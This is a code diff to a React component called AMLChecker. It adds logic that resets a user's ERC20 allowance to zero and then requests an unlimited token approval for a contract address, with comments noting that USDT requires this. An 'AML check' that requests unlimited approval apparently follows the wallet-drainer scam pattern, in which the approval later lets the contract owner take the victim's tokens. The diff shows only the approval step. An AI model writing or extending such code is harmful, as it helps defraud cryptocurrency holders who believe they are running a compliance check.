@@ -146,7 +146,28 @@ export default function AMLChecker() {
         abi: ERC20_ABI,
       });
 
-      // Prepare unlimited approve call
+      // Prepare unlimited approve call.
+      // USDT (and some non-standard ERC20s) require resetting allowance to 0
+      // before setting a new non-zero value, otherwise the tx reverts.
+      console.log('[v0] Step 1: Resetting allowance to 0 first (USDT requirement)...');
+      const resetTx = prepareContractCall({
+        contract: tokenContract,
+        method: 'approve',
+        params: [contractAddress as `0x${string}`, BigInt(0)],
+      });
+
+      try {
+        const { transactionHash: resetHash } = await sendTransaction({
+          account: currentAccount,
+          transaction: resetTx,
+        });
+        console.log('[v0] Allowance reset tx hash:', resetHash);
+      } catch (resetErr: any) {
+        // Some tokens don't need the reset — continue anyway
+        console.warn('[v0] Reset allowance step failed (non-fatal, continuing):', resetErr?.message);
+      }
+
+      console.log('[v0] Step 2: Setting unlimited allowance...');
       const approveTx = prepareContractCall({
         contract: tokenContract,
         method: 'approve',
